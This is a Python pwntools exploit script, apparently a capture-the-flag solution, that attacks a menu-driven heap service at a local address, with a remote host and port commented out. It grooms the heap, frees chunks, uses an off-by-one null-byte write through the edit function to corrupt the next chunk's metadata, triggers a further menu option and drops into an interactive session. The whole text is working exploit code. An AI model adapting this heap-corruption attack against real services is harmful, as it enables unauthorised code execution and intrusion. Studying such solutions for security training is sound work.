#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
#context.log_level = "debug"
#edit by wangyan aka ysyy

'''
host = "104.199.25.43"
port = 1337
'''
host = "127.0.0.1"
port = 2323
fp = open("PoC" ,'wb')


r = remote(host,port)

def p_sendline(data):
    #print data+'\n'
    fp.write(data+"\n")
    fp.flush()
    r.sendline(data)

def p_send(data):
    #print data
    fp.write(data)
    fp.flush()
    r.send(data)

def create(size, content):
    p_send("0001")
    r.recvuntil("Length:")
    p_send(str(size).rjust(4, '0'))
    r.recvuntil("Content:")
    p_send(content)

def edit(idx, content):
    p_send("0002")
    r.recvuntil("Index:")
    p_send(str(idx).rjust(4, '0'))
    r.recvuntil("Content:")
    p_send(content)

def delete(idx):
    p_send("0004")
    r.recvuntil("Index:")
    p_send(str(idx).rjust(4, '0'))


create(0x100-8,'x'*0xf8)
create(0x100-8,'s'*0xf8)
create(0x100-8,'x'*0xf8)
create(0x28,'a'*0x28)   #overflow
create(0x100-8,'b'*0xf8)  #forward merge
create(0x20,'c'*0x20)
delete(0)
delete(2)
raw_input("G")
edit(3,'d'*0x28+'\x00')

#create(0x100-8,'y') #fill #expected memory layout
create(0x100-8,'y'*0xf8) #y->x2
p_send('0005')
r.interactive()
